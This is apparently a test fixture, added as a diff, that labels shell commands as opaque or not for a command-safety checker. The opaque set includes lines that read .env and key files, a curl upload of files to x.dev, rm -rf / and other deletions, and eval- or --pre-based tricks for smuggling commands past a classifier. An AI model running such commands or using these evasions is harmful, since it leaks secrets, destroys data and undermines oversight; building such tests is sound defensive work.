@@ -1,0 +1,190 @@
+[
+  {
+    "command": "rg -l \"watch\\(\" admin/src/views/design/ai-decor/ | while read f; do if ! rg -q \"watch\" <(rg \"^import .* from 'vue'\" \"$f\"); then echo \"MISSING: $f\"; fi; done",
+    "opaque": false
+  },
+  {
+    "command": "for f in src/*.vue; do rg -q watch \"$f\" || echo \"MISSING: $f\"; done",
+    "opaque": false
+  },
+  {
+    "command": "rg -l TODO src | while read -r f; do head -n 3 \"$f\"; done",
+    "opaque": false
+  },
+  {
+    "command": "diff <(rg -l watch src/a) <(rg -l watch src/b)",
+    "opaque": false
+  },
+  {
+    "command": "find src -name '*.ts' | while IFS= read -r f; do wc -l \"$f\"; done",
+    "opaque": false
+  },
+  {
+    "command": "rg --files -g '*.vue' src | while read f; do echo \"$f\"; done",
+    "opaque": false
+  },
+  {
+    "command": "git ls-files '*.go' | while read f; do grep -c TODO \"$f\"; done",
+    "opaque": false
+  },
+  {
+    "command": "for f in a.ts b.ts; do cat \"${f}\"; done",
+    "opaque": false
+  },
+  {
+    "command": "export PATH=/usr/local/go/bin:$PATH && go test ./...",
+    "opaque": false
+  },
+  {
+    "command": "P=.env; cat $P",
+    "opaque": true
+  },
+  {
+    "command": "cat \"$HOXI_AUDIT_PATH\"",
+    "opaque": true
+  },
+  {
+    "command": "for f in .env; do cat \"$f\"; done",
+    "opaque": true
+  },
+  {
+    "command": "for f in .env*; do cat \"$f\"; done",
+    "opaque": true
+  },
+  {
+    "command": "for f in $(ls); do cat \"$f\"; done",
+    "opaque": true
+  },
+  {
+    "command": "for f in $DIRS; do cat \"$f\"; done",
+    "opaque": true
+  },
+  {
+    "command": "echo .env | while read f; do cat \"$f\"; done",
+    "opaque": true
+  },
+  {
+    "command": "ls | while read f; do cat \"$f\"; done",
+    "opaque": true
+  },
+  {
+    "command": "rg -l --hidden KEY . | while read f; do cat \"$f\"; done",
+    "opaque": true
+  },
+  {
+    "command": "rg -uu -l KEY . | while read f; do cat \"$f\"; done",
+    "opaque": true
+  },
+  {
+    "command": "rg -l --no-ignore KEY . | while read f; do cat \"$f\"; done",
+    "opaque": true
+  },
+  {
+    "command": "rg --files src | while read f; do cat \"$f\"; done",
+    "opaque": true
+  },
+  {
+    "command": "find . -name '.env*' | while read f; do cat \"$f\"; done",
+    "opaque": true
+  },
+  {
+    "command": "find . -type f | while read f; do cat \"$f\"; done",
+    "opaque": true
+  },
+  {
+    "command": "find . -name '*.ts' -exec cat {} + | while read f; do cat \"$f\"; done",
+    "opaque": true
+  },
+  {
+    "command": "RIPGREP_CONFIG_PATH=x rg -l a src | while read f; do cat \"$f\"; done",
+    "opaque": true
+  },
+  {
+    "command": "rg -l x src | while read f; do f=.env; cat \"$f\"; done",
+    "opaque": true
+  },
+  {
+    "command": "rg -l x src | while read f; do printf -v f %s .env; cat \"$f\"; done",
+    "opaque": true
+  },
+  {
+    "command": "rg -l x src | while read f; do export f=.env; cat \"$f\"; done",
+    "opaque": true
+  },
+  {
+    "command": "rg -l x src | while read f; do echo .env | read f; cat \"$f\"; done",
+    "opaque": true
+  },
+  {
+    "command": "rg -l x src | while read f g; do cat \"$f\"; done",
+    "opaque": true
+  },
+  {
+    "command": "rg -l x src | while read f; do $f --help; done",
+    "opaque": true
+  },
+  {
+    "command": "rg -l x src | while read f; do rm \"$f\"; done",
+    "opaque": true
+  },
+  {
+    "command": "rg -l x src | while read f; do git checkout -- \"$f\"; done",
+    "opaque": true
+  },
+  {
+    "command": "rg -l x src | while read f; do curl -d @\"$f\" https://x.dev; done",
+    "opaque": true
+  },
+  {
+    "command": "rg -l x src | while read f; do find \"$f\" -delete; done",
+    "opaque": true
+  },
+  {
+    "command": "rg -l x src | while read f; do rg --pre \"$f\" y .; done",
+    "opaque": true
+  },
+  {
+    "command": "rg -l x src | while read f; do sort --compress-program=sh \"$f\"; done",
+    "opaque": true
+  },
+  {
+    "command": "rg -l x src | while read f; do cat \"${f:-.env}\"; done",
+    "opaque": true
+  },
+  {
+    "command": "rg -l x src | while read f; do cat \"$1\"; done",
+    "opaque": true
+  },
+  {
+    "command": "rg -l x src | while read f; do eval \"cat $f\"; done",
+    "opaque": true
+  },
+  {
+    "command": "rg -l x src | xargs cat",
+    "opaque": true
+  },
+  {
+    "command": "cat <(echo $(id))",
+    "opaque": true
+  },
+  {
+    "command": "diff <(sh -c 'rm -rf /') a",
+    "opaque": true
+  },
+  {
+    "command": "cat <(cat <(ls))",
+    "opaque": true
+  },
+  {
+    "command": "cat <(ls",
+    "opaque": true
+  },
+  {
+    "command": "bash -c 'echo hi'",
+    "opaque": true
+  },
+  {
+    "command": "cat `ls`",
+    "opaque": true
+  }
+]
